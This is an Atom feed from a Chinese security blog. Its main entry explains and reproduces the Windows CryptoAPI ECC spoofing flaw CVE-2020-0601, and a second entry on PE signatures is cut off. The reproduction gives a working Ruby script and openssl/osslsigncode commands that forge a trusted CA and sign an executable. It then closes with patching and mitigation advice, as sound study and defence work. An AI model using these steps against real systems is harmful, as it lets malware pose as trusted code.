<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>v5le0n9&#39;s garden</title>
  
  <subtitle>小凉的秘密基地</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-07-08T15:44:06.771Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>v5le0n9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-0601漏洞复现及防御机制</title>
    <link href="http://example.com/posts/2ae8b8b2.html"/>
    <id>http://example.com/posts/2ae8b8b2.html</id>
    <published>2022-07-07T05:48:31.201Z</published>
    <updated>2022-07-08T15:44:06.771Z</updated>
    
    <content type="html"><![CDATA[<p>基于<a href="https://v5le0n9.github.io/posts/8fb0b0f6.html">PE数字签名</a>，微软证书漏洞(CVE-2020-0601)在实现椭圆曲线加密(ECC)算法数字证书验证时产生，位于<code>CryptoAPI.dll</code>文件。可被利用与伪造来组可信任来源的签名或证书，并且因其业务特性会衍生出多种攻击向量，具有极高的可利用价值和极大的潜在破坏力。</p><span id="more"></span><h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>CVE-2020-0601漏洞位于窗口的加密组件CryptoAPI中。 CryptoAPI是微软提供给开发者的Windows安全服务APP接口，可以用于加密的APP应用，实现数据的加密、解密、签名、验证等功能。</p><p>可能影响信任的一些实例包括：</p><ul><li>HTTPS连接</li><li>文件签名</li><li>电子邮件签名</li><li>以用户模式启动的签名可执行程序</li></ul><p>此外，该漏洞可以让攻击者伪造代码签名证书对恶意可执行文件进行签名，使文件看似来自可信来源。例如，可以让勒索软件或其它间谍软件拥有看似有效的证书，从而促使用户安装。中间人攻击并解密用户连接到受影响软件的机密信息也是主要的攻击场景之一。</p><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>由<code>Crypt32.dll</code>提供的微软Windows CryptoAPI无法正确验证ECC证书的信任链。 攻击者可以利用这个漏洞伪造可信的根证书并颁发证书。 <code>Crypt32.dll</code>的<code>CertGetCertifiCAteChain()</code>函数用于验证X.509的合法性，并跟踪受信任的根CA颁发的证书。 由于函数存在漏洞，无法正确验证包含第三方非微软根证书的证书。</p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>目前，支持使用带有指定参数的ECC密钥的证书的Microsoft Windows版本会受到影响，包括：</p><ul><li>Windows 10</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>依赖于Windows CryptoAPI的应用程序</li></ul><p>由于Windows 7、Windows Server 2008 R2没有默认添加微软的ECC根证书，<code>crypt32.dll</code>里也没有这个hash值，不能直接对比通过，故不受影响。</p><h1 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-ECC加密算法"><a href="#2-1-ECC加密算法" class="headerlink" title="2.1 ECC加密算法"></a>2.1 ECC加密算法</h2><p>基础知识：ECC私钥+椭圆曲线=ECC公钥</p><p>漏洞成因：微软的私钥+微软选的椭圆曲线=微软根证书里的公钥</p><p>​                    黑客的私钥+黑客选的椭圆曲线=微软根证书里的公钥</p><p>不同的椭圆曲线和不同的私钥，能产生相同的公钥。Win 10默认添加了微软的ECC根证书，在做证书验证时，会一直验证到微软根证书中的公钥hash值，这个值直接写在了<code>crypt32.dll</code>里面，验证时没有对比是不是同一个椭圆曲线，只对比了公钥值，导致黑客拿自己的私钥签名，就能伪装成微软的签名。</p><p>要形象地理解椭圆曲线加密算法，可以结合图形来看，以下是一个符合椭圆曲线的方程及图像。</p><script type="math/tex; mode=display">y^2=x^3+ax+b</script><img src="/posts/undefined/1.2.1.png" class="" title="椭圆曲线"><p>椭圆曲线具有一些独特的性质使它适合用于加密算法：</p><ul><li>椭圆曲线关于x轴对称</li><li>任何一条非垂直的线与曲线最多有三个点相交</li><li>曲线是光滑的，即曲线的所有点都没有两个及以上的不同的切线</li></ul><p>在椭圆曲线上任意两点A、B，作直线交于椭圆曲线另一点C’，过C’作y轴的平行线与椭圆曲线交于C点，定义A+B=C。椭圆曲线的加法符合交换律和结合律。</p><img src="/posts/undefined/1.2.2.png" class="" title="椭圆曲线"><p>如果A、B点重合，则过A作椭圆曲线的切线，以同样的方法得到对应的结果C=2A。</p><img src="/posts/undefined/1.2.3.png" class="" title="椭圆曲线"><p>接下来是椭圆曲线加密相关的重点，如果对n个A进行累加，则可依次累加连线得到nA的值。</p><ol><li>起点为A，终点D=3A，阶为3</li><li>起点为A，终点G=4A，阶为4</li></ol><img src="/posts/undefined/1.2.4.png" class="" title="椭圆曲线"><p><strong>椭圆曲线加密算法的数学依据：</strong></p><p>考虑K=kG，其中K、G为椭圆曲线Ep(a,b)上的点，n为G的阶。k为小于n的整数。给定k和G，根据加法法则计算K很容易(逐次求解)；但反过来，给定K和G，求k就非常困难。因为实际使用中的ECC原则上把私钥k取得相当大，n也相当大，且椭圆曲线不再连续而是在实数内离散的值，要把n个离散的值逐一算出几乎是不可能的。</p><img src="/posts/undefined/1.2.5.png" class="" title="椭圆曲线"><ul><li>点G称为基点</li><li>k(k&lt;n)为私有密钥</li><li>K为公开密钥</li></ul><p><strong>ECC和RSA加密算法对比：</strong></p><p>椭圆曲线加密算法(ECC)和RSA同样是一种公钥密钥加密技术，对原始数据以公钥加密，以私钥解密，即便攻击者获取密文和公钥也无法(在合理的时间或代价下)解密获取明文。ECC常被应用于数字签名，以私钥加密生成签名，以公钥解密验证签名，如果和原文一样则签名验证成功。公开密钥加密之所以可靠是因为它们利用了公钥密码领域的单向函数原理，正向操作非常简单，而逆向操作非常困难。</p><p>由G(基点)出发，进行k(私钥)次变换，很容易地得到终点K(公钥)的值。</p><img src="/posts/undefined/1.2.6.png" class="" title="椭圆曲线"><p>已知G(基点)和K(公钥)，要逆推得到移动次数k(私钥)则是一个很难的问题。</p><img src="/posts/undefined/1.2.7.png" class="" title="椭圆曲线"><p>相比传统的RSA加密算法，椭圆加密算法具有着天生的优势，椭圆加密算法的逆向过程相比RSA有着更大的时间复杂度。在密钥长度相同的情况下，椭圆加密算法相比RSA具有更好的安全强度。一般认为，160比特的椭圆曲线即可提供与1024比特的RSA密钥相当的安全强度。</p><p>较短的密钥也意味着更少的存储空间、更快的加解密速度和更少的带宽消耗，正因为椭圆加密算法的这些优势，它被用于Windows的签名系统、HTTPS的证书、比特币系统和中国的二代身份证系统中。</p><p>虽然椭圆曲线加密算法具有着许多优势，纯算法角度攻破难度极大，微软对此算法的实现的缺漏却给漏洞利用提供了可乘之机。回到椭圆曲线加密最基本的等式K=kG，首先需要明确的是，虽然对于给定的基点G和公钥K，要求解私钥k很困难，但如果可以任意指定基点G，要构造一对k和G使等式成立却极其简单。最简单的情况，令基点G=K，则私钥k=1，这样一对基点和私钥可以使等式成立，也是有效的解。</p><img src="/posts/undefined/1.2.8.png" class="" title="椭圆曲线"><p>在正常的标准椭圆曲线算法中，基点G并不是随意指定的，而是有固定的值(标准文件会对基点G等参数的选择作出规定)，例如在secp256r1版本的椭圆曲线算法中，基点G应当为标准规定的固定值，如果对参数不加验证，使得用户可以自定义传入的基点G值(作为函数的参数)，上面的私钥k=1的特殊解即可成立。</p><p>在有漏洞版本的<code>crypt32.dll</code>中验证使用ECC算法签名部分的函数恰恰是这个情况，原先的函数未加参数验证，参与计算的基点G的内容由被验证的证书随意指定，使未授权的证书能够构建私钥k=1的特殊解来成功通过椭圆加密算法的签名验证的过程。</p><h2 id="2-2-Windows证书验证"><a href="#2-2-Windows证书验证" class="headerlink" title="2.2 Windows证书验证"></a>2.2 Windows证书验证</h2><p>以SSL协议为例，讲解Windows如何进行证书验证。小明(m)在某电商(x)网站上购买了一本书，这时就调用了SSL协议进行通讯，建立SSL协议的步骤总结为下图：</p><img src="/posts/undefined/1.2.9.jpg" class="" title="SSL协议"><p>基本步骤包括：</p><ol><li>打招呼：小明和电商互相介绍自己，小明和电商协商好以后的步骤里将使用到的特定密码算法。在本漏洞中，该算法为ECC加密算法。(该步骤没有利用密码工具)</li><li>身份验证：电商向小明验证自己的身份，电商发送包含自己的公钥的证书，该证书由权威的第三方证书机构(CA)颁发。小明使用CA的公开验证密钥，验证证书中对PK的签名。(漏洞触发地方)</li><li>信息加密：由小明生成一个随机的密钥MS，该密钥用于生成对双方传输的信息进行对称加密的$K_1$与$K_2$。MS由小明从电商那里获得的证书公钥进行加密并交给电商。电商通过手中的私钥解密获得MS。这时双方都获得了用于进行加密通讯的密钥。</li></ol><p>注意：</p><ul><li>在SSL会话过程中，只有电商一方被要求提供证书，小明可能根本没有公钥(或证书)。</li><li>该漏洞的触发点在于第三方权威机构在步骤2验证证书时产生的逻辑漏洞，使得攻击者可以通过伪造证书将自身伪装成电商，与小明进行通讯。</li><li>通过及时更新微软补丁包可以有效防止上述情况发生。</li></ul><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>靶机：Win 10 家庭版 x64</p><p>利用工具：</p><ul><li>WSL(Windows Subsystem for Linux)</li><li>Ruby环境</li></ul><h2 id="3-2-复现准备"><a href="#3-2-复现准备" class="headerlink" title="3.2 复现准备"></a>3.2 复现准备</h2><p>下载并安装WSL，“以管理员身份运行”Powershell，输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure><p>更多个性化设置看<a href="https://docs.microsoft.com/zh-cn/windows/wsl/install">使用 WSL 在 Windows 上安装 Linux</a>。</p><img src="/posts/undefined/3.2.1.png" class="" title="安装WSL"><p>安装完成后重启，输入命令安装Ubuntu发行版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --install --distribution Ubuntu</span><br></pre></td></tr></table></figure><p>创建用户账号和密码，与Windows的账号密码不相关。</p><img src="/posts/undefined/3.2.2.png" class="" title="创建账号密码"><p>此后再次打开子系统直接在CMD窗口输入命令<code>wsl</code>即可。子系统与VMware中的虚拟机互斥，要想开启虚拟机，则在CMD窗口输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype off</span><br></pre></td></tr></table></figure><p>重启。如果想打开子系统，则需设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype auto</span><br></pre></td></tr></table></figure><p>在Ubuntu的基础上安装Ruby环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ruby</span><br></pre></td></tr></table></figure><p>导出微软的任意一个ECC密钥证书，这是微软在实现椭圆曲线加密(ECC)算法的数字证书，位于<code>CryptoAPI.dll</code>文件，也是被我们用来伪造可信任来源的签名漏洞。导出方法请看<a href="https://v5le0n9.github.io/posts/8fb0b0f6.html#1-2-2-微软数字签名证书">PE数字签名 1-2-2微软数字签名证书</a>。</p><h2 id="3-3-复现过程"><a href="#3-3-复现过程" class="headerlink" title="3.3 复现过程"></a>3.3 复现过程</h2><p>将<code>main.rb</code>文件和导出的微软ECC签名证书文件复制到WSL。</p><img src="/posts/undefined/3.3.1.png" class="" title="复制到WSL"><p>接着运行Ruby代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer</span><br></pre></td></tr></table></figure><p>生成<code>spoofed_ca.key</code>公钥文件。</p><img src="/posts/undefined/3.3.2.png" class="" title="spoofed_ca.key"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN EC PRIVATE KEY-----</span><br><span class="line">MIIB+gIBAQQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAABoIIBWzCCAVcCAQEwPAYHKoZIzj0BAQIxAP//////////////////</span><br><span class="line">///////////////////////+/////wAAAAAAAAAA/////zB7BDD/////////////</span><br><span class="line">/////////////////////////////v////8AAAAAAAAAAP////wEMLMxL6fiPufk</span><br><span class="line">mI4Fa+P4LRkYHZxu/oFBEgMUCI9QE4daxlY5jYou0Z0qhcjt0+wq7wMVAKM1kmqj</span><br><span class="line">GaJ6HQCJamdzpIJ6zaxzBGEExxEWKnYdVo6+uWJl1MPOtPDDMOyPbdduObzISaur</span><br><span class="line">uONDeNWBBl3vx32fztazkHXeDLCQ3iO6yNE+Z+AZqRuGMR5fNC3uF/0V+34nijKh</span><br><span class="line">6smPyX4Yyy87LEh6fab0AQesAjEA////////////////////////////////x2NN</span><br><span class="line">gfQ3Ld9YGg2ySLCneuzsGWrMxSlzAgEBoWQDYgAExxEWKnYdVo6+uWJl1MPOtPDD</span><br><span class="line">MOyPbdduObzISauruONDeNWBBl3vx32fztazkHXeDLCQ3iO6yNE+Z+AZqRuGMR5f</span><br><span class="line">NC3uF/0V+34nijKh6smPyX4Yyy87LEh6fab0AQes</span><br><span class="line">-----END EC PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p><code>main.rb</code>代码如下，设置私钥为1，使得加密等式成立，并生成证书公钥文件。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;openssl&#x27;</span></span><br><span class="line"></span><br><span class="line">raw = File.read <span class="variable constant_">ARGV</span>[<span class="number">0</span>]</span><br><span class="line">ca = <span class="title class_">OpenSSL::X509::Certificate</span>.new(raw) <span class="comment"># Read certificate</span></span><br><span class="line">ca_key = ca.public_key <span class="comment"># Parse public key from CA</span></span><br><span class="line"></span><br><span class="line">ca_key.private_key = <span class="number">1</span> <span class="comment"># Set a private key, which will match Q = d&#x27;G&#x27;</span></span><br><span class="line">group = ca_key.group</span><br><span class="line">group.set_generator(ca_key.public_key, group.order, group.cofactor)</span><br><span class="line">group.asn1_flag = OpenSSL::PKey::<span class="variable constant_">EC</span><span class="symbol">:</span><span class="symbol">:EXPLICIT_CURVE</span></span><br><span class="line">ca_key.group = group <span class="comment"># Set new group with fake generator G&#x27; = Q</span></span><br><span class="line"></span><br><span class="line">File.open(<span class="string">&quot;spoofed_ca.key&quot;</span>, <span class="string">&#x27;w&#x27;</span>) &#123; |<span class="params">f</span>| f.write ca_key.to_pem &#125;</span><br></pre></td></tr></table></figure><p>基于此密钥生成一个新的x509证书，这将是我们自己的欺骗性CA。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt</span><br></pre></td></tr></table></figure><img src="/posts/undefined/3.3.3.png" class="" title="spoofed_ca.crt"><p>国家、地区等等这些可以随便填，生成<code>spoofed_ca.crt</code>公钥文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIDnjCCAySgAwIBAgIUT60jMVGMy5H1KVo51W4nLMUvlUkwCgYIKoZIzj0EAwIw</span><br><span class="line">WjELMAkGA1UEBhMCV1gxDDAKBgNVBAgMA0xXWDEPMA0GA1UEBwwGQVlHWllMMQww</span><br><span class="line">CgYDVQQKDANZQ0YxDDAKBgNVBAsMAzIzMzEQMA4GA1UEAwwHdjVsZTBuOTAeFw0y</span><br><span class="line">MjA3MDgxNDA3MjFaFw0yMjA4MDcxNDA3MjFaMFoxCzAJBgNVBAYTAldYMQwwCgYD</span><br><span class="line">VQQIDANMV1gxDzANBgNVBAcMBkFZR1pZTDEMMAoGA1UECgwDWUNGMQwwCgYDVQQL</span><br><span class="line">DAMyMzMxEDAOBgNVBAMMB3Y1bGUwbjkwggHMMIIBZAYHKoZIzj0CATCCAVcCAQEw</span><br><span class="line">PAYHKoZIzj0BAQIxAP/////////////////////////////////////////+////</span><br><span class="line">/wAAAAAAAAAA/////zB7BDD/////////////////////////////////////////</span><br><span class="line">/v////8AAAAAAAAAAP////wEMLMxL6fiPufkmI4Fa+P4LRkYHZxu/oFBEgMUCI9Q</span><br><span class="line">E4daxlY5jYou0Z0qhcjt0+wq7wMVAKM1kmqjGaJ6HQCJamdzpIJ6zaxzBGEExxEW</span><br><span class="line">KnYdVo6+uWJl1MPOtPDDMOyPbdduObzISauruONDeNWBBl3vx32fztazkHXeDLCQ</span><br><span class="line">3iO6yNE+Z+AZqRuGMR5fNC3uF/0V+34nijKh6smPyX4Yyy87LEh6fab0AQesAjEA</span><br><span class="line">////////////////////////////////x2NNgfQ3Ld9YGg2ySLCneuzsGWrMxSlz</span><br><span class="line">AgEBA2IABMcRFip2HVaOvrliZdTDzrTwwzDsj23Xbjm8yEmrq7jjQ3jVgQZd78d9</span><br><span class="line">n87Ws5B13gywkN4jusjRPmfgGakbhjEeXzQt7hf9Fft+J4oyoerJj8l+GMsvOyxI</span><br><span class="line">en2m9AEHrKNTMFEwHQYDVR0OBBYEFEPvcIe4nb/siBncxsRrdQ11NDMIMB8GA1Ud</span><br><span class="line">IwQYMBaAFEPvcIe4nb/siBncxsRrdQ11NDMIMA8GA1UdEwEB/wQFMAMBAf8wCgYI</span><br><span class="line">KoZIzj0EAwIDaAAwZQIxAMEufTnFga8x12v62Sh3GFqNbEYV10JiZCDyCvq6AJBI</span><br><span class="line">+KcouXc8fG1wctZ00t9qrQIwSZDpKeKQaQJIzJSC/0cmiUGyhQhRT8KkM4d/zLXr</span><br><span class="line">wfzVUW6NaVjoOiBIGagB1jXX</span><br><span class="line">-----END CERTIFICATE-----</span><br></pre></td></tr></table></figure><p>使用下面命令生成一个新密钥，该密钥可以是我们想要的任何类型，它将用于创建代码签名证书，我们将使用自己的CA对其进行签名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl ecparam -name secp384r1 -genkey -noout -out cert.key</span><br></pre></td></tr></table></figure><p>生成<code>cert.key</code>新密钥文件。</p><img src="/posts/undefined/3.3.4.png" class="" title="cert.key"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN EC PRIVATE KEY-----</span><br><span class="line">MIGkAgEBBDCAStK2Htw/59O0noNiH5S1h26FWYO2nG58Gm3mWvskqI2iNmHaMckI</span><br><span class="line">rdlMLGfQ/QWgBwYFK4EEACKhZANiAAR5OFuxa8zYDkJ8cAo52gUJ4p8+J5johGhZ</span><br><span class="line">u3rwbSz0AU/vvuYfQO6N88q9a0KtlWqZA7GiwZ0mmG3ZhhzpRtkf2Uxq/9pHgEPA</span><br><span class="line">pp5LrQMLZPCw0gki3VAyN41+DJWtLWQ=</span><br><span class="line">-----END EC PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>接下来创建一个新的证书签名请求(CSR)，该请求通常会发送到受信任的CA，但是由于存在欺骗请求，因此我们可以自己对其进行签名。</p><p>前提是我们把<code>openssl_cs.conf</code>复制到该目录下，此时生成<code>cert.csr</code>文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key cert.key -out cert.csr -config openssl_cs.conf -reqexts v3_cs</span><br></pre></td></tr></table></figure><img src="/posts/undefined/3.3.5.png" class="" title="cert.csr"><p>使用我们的欺骗性CA和CA密钥签署的新CSR，生成<code>cert.crt</code>证书，有效期10000天，即2049年到期，而真正的受信任Microsoft ECC CA在2043年到期。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_cs.conf -extensions v3_cs</span><br></pre></td></tr></table></figure><img src="/posts/undefined/3.3.6.png" class="" title="cert.crt"><p>将证书的密钥和欺骗性的CA打包到一个PKCS12文件中，以对可执行文件进行签名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile spoofed_ca.crt -name &quot;Code Signing&quot; -out cert.p12</span><br></pre></td></tr></table></figure><p>让输入密码时直接回车(否则后面签名时会失败)，生成<code>cert.p12</code>证书文件。</p><img src="/posts/undefined/3.3.7.png" class="" title="cert.p12"><p>安装osslsigncode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install osslsigncode</span><br></pre></td></tr></table></figure><p>出现以下错误：</p><img src="/posts/undefined/3.3.8.png" class="" title="出现错误"><p>执行命令<code>sudo apt-get update</code>再下载想要安装的软件即可。</p><p>用PKCS12文件签名某个可执行文件，如这里的<code>python.exe</code>。(<code>python.exe</code>要在本目录下或在命令里修改为绝对路径)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osslsigncode sign -pkcs12 cert.p12 -n &quot;Signed by ollypwn&quot; -in python.exe -out python_signed.exe</span><br></pre></td></tr></table></figure><img src="/posts/undefined/3.3.9.png" class="" title="对可执行文件签名"><p>查看<code>python_signed.exe</code>文件的数字签名详细信息，比如2049年到期，颁发者为v5le0n9，以及设置的签名信息，证书可靠。该可执行文件的数字签名校验通过，并且成功欺骗了系统。(下面两图为借用)</p><img src="/posts/undefined/3.3.11.png" class="" title="查看数字证书"><img src="/posts/undefined/3.3.10.png" class="" title="查看数字证书"><p>由于我更新了补丁，<code>python_signed.exe</code>文件报毒并且它的数字签名显示无法验证。</p><img src="/posts/undefined/3.3.12.png" class="" title="查看数字证书"><h1 id="4-防御措施"><a href="#4-防御措施" class="headerlink" title="4. 防御措施"></a>4. 防御措施</h1><h2 id="4-1-缓解措施"><a href="#4-1-缓解措施" class="headerlink" title="4.1 缓解措施"></a>4.1 缓解措施</h2><p>快速采用补丁是目前已知较好的缓解措施。尽管尚未出现公开的攻击方式和案例，但建议及时安装安全更新。更新后，当检测到有人试图利用CVE-2020-0601进行攻击时，系统将在每次重新启动Windows日志后在事件查看器中生成事件ID。</p><h2 id="4-2-安全建议"><a href="#4-2-安全建议" class="headerlink" title="4.2 安全建议"></a>4.2 安全建议</h2><p>除了安装补丁程序之外，企业还可以采取其它措施保护端点，比如：</p><ul><li>从网络流量中提取证书，检查可疑的属性；</li><li>通过执行TLS检查，不使用Windows进行证书验证的代理设备承载流量；</li><li>在企业内部部署私有根证书颁发机构，并且在特定计算机/服务器位置控制第三方软件的部署和使用；</li><li>符合条件的企业可以申请假如微软Security Update Validation Program(SUVP)或Microsoft Active Protections Program(MAPP)，从而提前从微软获得安全更新以进行相关的测试分析。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;基于&lt;a href=&quot;https://v5le0n9.github.io/posts/8fb0b0f6.html&quot;&gt;PE数字签名&lt;/a&gt;，微软证书漏洞(CVE-2020-0601)在实现椭圆曲线加密(ECC)算法数字证书验证时产生，位于&lt;code&gt;CryptoAPI.dll&lt;/code&gt;文件。可被利用与伪造来组可信任来源的签名或证书，并且因其业务特性会衍生出多种攻击向量，具有极高的可利用价值和极大的潜在破坏力。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>PE数字签名</title>
    <link href="http://example.com/posts/8fb0b0f6.html"/>
    <id>http://example.com/posts/8fb0b0f6.html</id>
    <published>2022-07-03T03:00:54.381Z</published>
    <updated>2022-07-07T05:47:22.383Z</updated>
    
    <content type="html"><![CDATA[<p>在做Android逆向题时就遇到过对APK文件进行签名的题，奇安信面试官跟我说，无论是做哪个平台的逆向，它的大方向、学习路径总是相似的。比如Android逆向有签名、有Hook和注入技术，Windows逆向也是有的。所以这篇笔记就是学习PE文件的数字签名。</p><span id="more"></span><h1 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1. 基础概念"></a>1. 基础概念</h1><p>PE文件全称是Portable Executable，意为可移植的可执行文件，常见的EXE、DLL、OCX、SYS、COM等都是PE文件。</p><p>为什么要对PE文件进行数字签名呢？</p><ul><li>防篡改：通过对数字签名的验证，保证文件未被非法篡改</li><li>降低误报：安全软件通过验证文件是否有正规厂商的数字签名来降低误报</li></ul><p>PE文件数字签名信息存放在<code>Certificate Table</code>位置，同时PE文件可选文件头<code>DataDirectory</code>第5项记录文件偏移及大小。</p><img src="/posts/8fb0b0f6/1.1.2.png" class="" title="数字签名存放位置"><p>使用PEView查看签名前后对比图，可以看到<code>Certificate Table</code>存储相关签名信息。</p><img src="/posts/8fb0b0f6/3.1.11.png" class="" title="数字签名证书"><h2 id="1-1-PE文件数字签名及验证过程"><a href="#1-1-PE文件数字签名及验证过程" class="headerlink" title="1.1 PE文件数字签名及验证过程"></a>1.1 PE文件数字签名及验证过程</h2><p>签名：</p><ol><li>软件发布者使用散列算法(如MD5或SHA)计算PE文件的散列值</li><li>软件发布者使用私钥对散列值进行签名得到签名数据</li><li>将签名私钥对应的公钥和签名数据等以证书的形式附加在PE文件中，形成经过数字签名的PE文件</li><li>软件发布者将经过数字签名的PE文件进行发布</li></ol><p>验证：</p><ol><li>从PE文件证书中提取软件发布者的公钥、使用的散列算法、签名算法、原始散列值的签名数据</li><li>使用提取的公钥和对应签名验证算法将签名数据还原为原始PE文件的原始散列值</li><li>对现有PE文件使用同样的散列算法计算出对应的散列值</li><li>对比两个散列值是否一致，从而判断数据是否被破坏或篡改</li></ol><img src="/posts/8fb0b0f6/1.1.1.png" class="" title="签名与验证过程"><h2 id="1-2-查看数字签名"><a href="#1-2-查看数字签名" class="headerlink" title="1.2 查看数字签名"></a>1.2 查看数字签名</h2><h3 id="1-2-1-PE文件数字签名证书"><a href="#1-2-1-PE文件数字签名证书" class="headerlink" title="1.2.1 PE文件数字签名证书"></a>1.2.1 PE文件数字签名证书</h3><p>以<code>toDesk.exe</code>为例，可以看到经过数字签名后的PE文件会多出一个“数字签名”属性，点击详细信息可以查看对应的证书。对应的证书信息包括签名算法、哈希算法、有效期、颁发者信息等。</p><img src="/posts/8fb0b0f6/1.2.1.png" class="" title="数字签名证书"><img src="/posts/8fb0b0f6/1.2.2.png" class="" title="数字签名证书"><h3 id="1-2-2-微软数字签名证书"><a href="#1-2-2-微软数字签名证书" class="headerlink" title="1.2.2 微软数字签名证书"></a>1.2.2 微软数字签名证书</h3><p>徽标键 + R -&gt; 输入<code>certmgr.msc</code>，可以看到这里面有2个系统默认的椭圆曲线加密(ECC)算法的根证书。随意选择一个导出，右键 -&gt; 所有任务 -&gt; 导出，选择Base64编码。</p><img src="/posts/8fb0b0f6/1.2.3.png" class="" title="导出微软数字签名证书"><p>可以看到导出的ECC密钥证书如下图所示，包括证书的有效期等信息。这就是微软在实现椭圆曲线加密(ECC)算法的数字证书，位于<code>CryptoAPI.dll</code>文件，也是被我们利用伪造可信任来源的签名漏洞。</p><img src="/posts/8fb0b0f6/1.2.4.png" class="" title="导出微软数字签名证书"><h2 id="1-3-数字签名常用算法及应用领域"><a href="#1-3-数字签名常用算法及应用领域" class="headerlink" title="1.3 数字签名常用算法及应用领域"></a>1.3 